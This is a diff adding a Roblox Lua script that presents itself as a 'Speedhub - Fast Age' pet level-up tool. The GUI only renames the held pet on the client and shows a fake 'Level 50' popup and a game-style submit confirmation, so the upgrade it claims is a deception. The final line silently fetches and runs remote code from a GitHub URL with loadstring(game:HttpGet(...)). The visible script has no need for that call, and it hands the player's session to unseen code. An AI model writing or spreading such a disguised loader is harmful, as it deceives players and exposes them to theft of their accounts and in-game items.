@@ -1,0 +1,406 @@
+local scriptContent = [[
+-- Pet Level-Up GUI by Chazai (Now with Speedhub Title + Fully Draggable)
+-- Modified by Gemini for submit confirmation UI
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local UserInputService = game:GetService("UserInputService")
+
+print("Pet Level-Up Script: Starting execution.")
+
+-- Ensure LocalPlayer and PlayerGui are available
+if not player then
+    warn("Pet Level-Up Script: ERROR - Could not get LocalPlayer. GUI will not appear.")
+    return
+end
+
+local playerGui = player:WaitForChild("PlayerGui", 10) -- Wait up to 10 seconds for PlayerGui
+if not playerGui then
+    warn("Pet Level-Up Script: ERROR - PlayerGui not found. GUI will not appear.")
+    return
+end
+
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "PetLevelUpVisual"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- Ensure ZIndex works correctly
+
+-- Main Frame
+local frame = Instance.new("Frame", gui)
+frame.Name = "MainFrame"
+frame.Size = UDim2.new(0, 260, 0, 160)
+frame.Position = UDim2.new(0.5, -130, 0.5, -80)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Active = true -- Make frame active for dragging
+
+-- Add UICorner for rounded corners to MainFrame
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 8)
+frameCorner.Parent = frame
+
+-- Title Above Frame (Speedhub - Fast Age)
+local hubTitle = Instance.new("TextLabel", frame)
+hubTitle.Name = "HubTitle"
+hubTitle.Size = UDim2.new(1, 0, 0, 20)
+hubTitle.Position = UDim2.new(0, 0, 0, -22)
+hubTitle.BackgroundTransparency = 1
+hubTitle.Text = "⚡ Speedhub - Fast Age"
+hubTitle.TextColor3 = Color3.fromRGB(255, 255, 0)
+hubTitle.Font = Enum.Font.SourceSansBold
+hubTitle.TextSize = 16
+hubTitle.ZIndex = 2
+
+-- Manual Draggable for the MainFrame
+local dragging = false
+local dragStart = Vector2.new(0, 0)
+local startPos = UDim2.new(0,0,0,0)
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Handled = true -- Consume input to prevent interaction with elements behind
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+-- GUI Inside Frame (using UIListLayout for better organization)
+local uiListLayout = Instance.new("UIListLayout", frame)
+uiListLayout.FillDirection = Enum.FillDirection.Vertical
+uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+uiListLayout.Padding = UDim.new(0, 5) -- Small padding between elements
+
+local uiPadding = Instance.new("UIPadding", frame)
+uiPadding.PaddingTop = UDim.new(0, 10)
+uiPadding.PaddingBottom = UDim.new(0, 10)
+uiPadding.PaddingLeft = UDim.new(0, 10)
+uiPadding.PaddingRight = UDim.new(0, 10)
+
+local title = Instance.new("TextLabel", frame)
+title.Name = "MainTitle"
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+title.Text = "🐾 Level Up Your Pet"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.ZIndex = 2
+
+-- Add UICorner for rounded corners to MainTitle
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.Parent = title
+
+local userLabel = Instance.new("TextLabel", frame)
+userLabel.Name = "UserLabel"
+userLabel.Size = UDim2.new(1, 0, 0, 25)
+userLabel.BackgroundTransparency = 1
+userLabel.Text = "User: " .. player.Name -- Dynamically set user name
+userLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+userLabel.Font = Enum.Font.SourceSans
+userLabel.TextSize = 16
+userLabel.ZIndex = 2
+
+local levelUpButton = Instance.new("TextButton", frame)
+levelUpButton.Name = "LevelUpButton"
+levelUpButton.Size = UDim2.new(0.8, 0, 0, 40)
+levelUpButton.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+levelUpButton.Text = "🔥 Level Up 50+ Instantly"
+levelUpButton.TextColor3 = Color3.new(1, 1, 1)
+levelUpButton.Font = Enum.Font.SourceSansBold
+levelUpButton.TextSize = 16
+levelUpButton.ZIndex = 2
+
+-- Add UICorner for rounded corners to LevelUpButton
+local levelUpButtonCorner = Instance.new("UICorner")
+levelUpButtonCorner.CornerRadius = UDim.new(0, 8)
+levelUpButtonCorner.Parent = levelUpButton
+
+local petInfo = Instance.new("TextLabel", frame)
+petInfo.Name = "PetInfoLabel"
+petInfo.Size = UDim2.new(1, 0, 0, 30)
+petInfo.BackgroundTransparency = 1
+petInfo.TextColor3 = Color3.fromRGB(180, 255, 180)
+petInfo.Font = Enum.Font.SourceSans
+petInfo.TextSize = 14
+petInfo.Text = ""
+petInfo.ZIndex = 2
+
+local credit = Instance.new("TextLabel", frame)
+credit.Name = "CreditLabel"
+credit.Size = UDim2.new(1, 0, 0, 20)
+credit.BackgroundTransparency = 1
+credit.Text = "Created by Chazai"
+credit.TextColor3 = Color3.fromRGB(150, 150, 150)
+credit.Font = Enum.Font.SourceSansItalic
+credit.TextSize = 14
+credit.ZIndex = 2
+
+-- Popup
+local popup = Instance.new("TextLabel", gui)
+popup.Name = "PopupMessage"
+popup.Size = UDim2.new(0, 350, 0, 50)
+popup.Position = UDim2.new(0.5, -175, 0.35, -25)
+popup.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
+popup.Text = "🎉 Congrats! You got a Level 50 pet!"
+popup.TextColor3 = Color3.new(1, 1, 1)
+popup.Font = Enum.Font.SourceSansBold
+popup.TextSize = 20
+popup.Visible = false
+popup.BorderSizePixel = 0
+popup.TextWrapped = true
+popup.ZIndex = 10 -- Ensure popup is on top
+
+-- Add UICorner for rounded corners to Popup
+local popupCorner = Instance.new("UICorner")
+popupCorner.CornerRadius = UDim.new(0, 8)
+popupCorner.Parent = popup
+
+-- *** NEW: Submit Confirmation Pop-up ***
+local submitConfirmFrame = Instance.new("Frame", gui)
+submitConfirmFrame.Name = "SubmitConfirmFrame"
+submitConfirmFrame.Size = UDim2.new(0, 350, 0, 200)
+submitConfirmFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
+submitConfirmFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+submitConfirmFrame.BorderSizePixel = 0
+submitConfirmFrame.Visible = false
+submitConfirmFrame.ZIndex = 11 -- Higher ZIndex than regular popup
+
+-- Add UICorner for rounded corners to SubmitConfirmFrame
+local submitConfirmCorner = Instance.new("UICorner")
+submitConfirmCorner.CornerRadius = UDim.new(0, 8)
+submitConfirmCorner.Parent = submitConfirmFrame
+
+-- UIListLayout for content inside submitConfirmFrame
+local confirmLayout = Instance.new("UIListLayout", submitConfirmFrame)
+confirmLayout.FillDirection = Enum.FillDirection.Vertical
+confirmLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+confirmLayout.Padding = UDim.new(0, 8)
+
+local confirmPadding = Instance.new("UIPadding", submitConfirmFrame)
+confirmPadding.PaddingTop = UDim.new(0, 10)
+confirmPadding.PaddingBottom = UDim.new(0, 10)
+confirmPadding.PaddingLeft = UDim.new(0, 10)
+confirmPadding.PaddingRight = UDim.new(0, 10)
+
+-- Close Button for Submit Confirmation Pop-up (Top Right 'X')
+local closeConfirmButton = Instance.new("TextButton", submitConfirmFrame)
+closeConfirmButton.Name = "CloseConfirmButton"
+closeConfirmButton.Size = UDim2.new(0, 25, 0, 25)
+closeConfirmButton.Position = UDim2.new(1, -35, 0, 10) -- Absolute position within parent
+closeConfirmButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeConfirmButton.Text = "X"
+closeConfirmButton.TextColor3 = Color3.new(1, 1, 1)
+closeConfirmButton.Font = Enum.Font.SourceSansBold
+closeConfirmButton.TextSize = 18
+closeConfirmButton.BorderSizePixel = 0
+closeConfirmButton.ZIndex = 12 -- Highest ZIndex
+
+-- Add UICorner for rounded corners to CloseConfirmButton
+local closeConfirmCorner = Instance.new("UICorner")
+closeConfirmCorner.CornerRadius = UDim.new(0, 8)
+closeConfirmCorner.Parent = closeConfirmButton
+
+-- Title Text
+local confirmTitle = Instance.new("TextLabel", submitConfirmFrame)
+confirmTitle.Name = "ConfirmTitle"
+confirmTitle.Size = UDim2.new(1, 0, 0, 30)
+confirmTitle.BackgroundTransparency = 1
+confirmTitle.Text = "Are you sure you want to submit that pet?"
+confirmTitle.TextColor3 = Color3.new(1, 1, 1)
+confirmTitle.Font = Enum.Font.SourceSansBold
+confirmTitle.TextSize = 18
+confirmTitle.TextWrapped = true
+confirmTitle.ZIndex = 12
+confirmTitle.LayoutOrder = 1
+
+-- Pet Info Text (Dynamic)
+local confirmPetInfo = Instance.new("TextLabel", submitConfirmFrame)
+confirmPetInfo.Name = "ConfirmPetInfo"
+confirmPetInfo.Size = UDim2.new(1, 0, 0, 25)
+confirmPetInfo.BackgroundTransparency = 1
+confirmPetInfo.TextColor3 = Color3.fromRGB(255, 255, 0) -- Yellow color from example
+confirmPetInfo.Font = Enum.Font.SourceSansBold
+confirmPetInfo.TextSize = 16
+confirmPetInfo.TextWrapped = true
+confirmPetInfo.ZIndex = 12
+confirmPetInfo.LayoutOrder = 2
+
+-- Warning Text
+local confirmWarning = Instance.new("TextLabel", submitConfirmFrame)
+confirmWarning.Name = "ConfirmWarning"
+confirmWarning.Size = UDim2.new(1, 0, 0, 25)
+confirmWarning.BackgroundTransparency = 1
+confirmWarning.Text = "Your pet will reset back to age 1."
+confirmWarning.TextColor3 = Color3.new(1, 1, 1)
+confirmWarning.Font = Enum.Font.SourceSans
+confirmWarning.TextSize = 14
+confirmWarning.TextWrapped = true
+confirmWarning.ZIndex = 12
+confirmWarning.LayoutOrder = 3
+
+-- Buttons Container for Cancel/Confirm
+local buttonContainer = Instance.new("Frame", submitConfirmFrame)
+buttonContainer.Name = "ButtonContainer"
+buttonContainer.Size = UDim2.new(1, 0, 0, 40)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.ZIndex = 12
+buttonContainer.LayoutOrder = 4
+
+local buttonListLayout = Instance.new("UIListLayout", buttonContainer)
+buttonListLayout.FillDirection = Enum.FillDirection.Horizontal
+buttonListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+buttonListLayout.Padding = UDim.new(0, 10) -- Gap between buttons
+
+-- Cancel Button
+local cancelButton = Instance.new("TextButton", buttonContainer)
+cancelButton.Name = "CancelButton"
+cancelButton.Size = UDim2.new(0.45, 0, 1, 0) -- Takes up 45% width of container
+cancelButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50) -- Red color from example
+cancelButton.Text = "Cancel"
+cancelButton.TextColor3 = Color3.new(1, 1, 1)
+cancelButton.Font = Enum.Font.SourceSansBold
+cancelButton.TextSize = 16
+cancelButton.BorderSizePixel = 0
+cancelButton.ZIndex = 13 -- Higher than container
+
+-- Add UICorner for rounded corners to CancelButton
+local cancelCorner = Instance.new("UICorner")
+cancelCorner.CornerRadius = UDim.new(0, 8)
+cancelCorner.Parent = cancelButton
+
+-- Confirm Button
+local confirmButton = Instance.new("TextButton", buttonContainer)
+confirmButton.Name = "ConfirmButton"
+confirmButton.Size = UDim2.new(0.45, 0, 1, 0) -- Takes up 45% width of container
+confirmButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50) -- Green color from example
+confirmButton.Text = "Confirm"
+confirmButton.TextColor3 = Color3.new(1, 1, 1)
+confirmButton.Font = Enum.Font.SourceSansBold
+confirmButton.TextSize = 16
+confirmButton.BorderSizePixel = 0
+confirmButton.ZIndex = 13 -- Higher than container
+
+-- Add UICorner for rounded corners to ConfirmButton
+local confirmCorner = Instance.new("UICorner")
+confirmCorner.CornerRadius = UDim.new(0, 8)
+confirmCorner.Parent = confirmButton
+
+-- Held Tool Finder
+local function getHeldTool()
+    for _, v in ipairs(char:GetChildren()) do
+        if v:IsA("Tool") then
+            return v
+        end
+    end
+    return nil
+end
+
+-- Show Popup (original level-up confirmation)
+local function showPopup(msg)
+    popup.Text = msg
+    popup.Visible = true
+    task.delay(3, function()
+        popup.Visible = false
+    end)
+end
+
+-- Update Pet Age
+local function levelUpPet(tool)
+    if tool then
+        local name = tool.Name
+        local updated = name:gsub("Age%s%d+", "Age 50")
+        if updated ~= name then
+            tool.Name = updated
+            petInfo.Text = "✅ Pet leveled to Age 50: " .. updated
+            showPopup("🎉 Congrats! You got a Level 50 pet!")
+        else
+            petInfo.Text = "❌ Couldn't find Age to update!"
+        end
+    end
+end
+
+-- Event Handlers for Submit Confirmation Pop-up
+closeConfirmButton.MouseButton1Click:Connect(function()
+    submitConfirmFrame.Visible = false
+    print("Submit Confirmation: Closed via X button.")
+end)
+
+cancelButton.MouseButton1Click:Connect(function()
+    submitConfirmFrame.Visible = false
+    print("Submit Confirmation: Canceled.")
+end)
+
+confirmButton.MouseButton1Click:Connect(function()
+    local heldTool = getHeldTool() -- Re-get held tool to ensure it's still valid
+    if heldTool then
+        levelUpPet(heldTool) -- Proceed with leveling up
+        print("Submit Confirmation: Confirmed. Pet leveled up.")
+    else
+        petInfo.Text = "❌ No pet held to level up after confirmation!"
+        warn("Submit Confirmation: No pet held after confirmation.")
+    end
+    submitConfirmFrame.Visible = false
+end)
+
+-- Button Action (Original Level Up Button now triggers confirmation)
+levelUpButton.MouseButton1Click:Connect(function()
+    local heldTool = getHeldTool()
+    if heldTool then
+        -- Attempt to extract pet name, weight, and age for display
+        local petName = heldTool.Name
+        local petWeight = "N/A" -- Assuming weight is not in tool name, or needs to be extracted differently
+        local petAge = "N/A" -- Assuming age is not in tool name, or needs to be extracted differently
+
+        -- Basic attempt to parse pet info from tool name if it follows a pattern like "PetName [Weight KG] [Age X]"
+        local pattern = "(.-)%s%[(%d+%.?%d*)%sKG%]%s%[Age%s(%d+)%]"
+        local matches = {petName:match(pattern)}
+        if #matches >= 3 then
+            petName = matches[1]
+            petWeight = matches[2] .. " KG"
+            petAge = "Age " .. matches[3]
+        else
+            -- Fallback if pattern doesn't match, try to get age if it's just "PetName Age X"
+            local agePattern = "Age%s(%d+)"
+            local ageMatch = petName:match(agePattern)
+            if ageMatch then
+                petAge = "Age " .. ageMatch
+            end
+        end
+
+        confirmPetInfo.Text = string.format("%s [%s] [%s]", petName, petWeight, petAge)
+        submitConfirmFrame.Visible = true
+        print("Level Up Button: Showing submit confirmation for pet:", heldTool.Name)
+    else
+        petInfo.Text = "❌ Hold a pet to level up!"
+        print("Level Up Button: No pet held.")
+    end
+end)
+
+print("Pet Level-Up Script: Initialization complete.")
+]]
+
+-- Attempt to load and execute the script content
+local success, func = pcall(loadstring, scriptContent)
+
+if success and func then
+    func()
+    print("Loader Script: Successfully loaded and executed the main script.")
+else
+    warn("Loader Script: ERROR - Failed to load and execute the main script:", func)
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hub-script/FastAger/main/V.1.1"))()
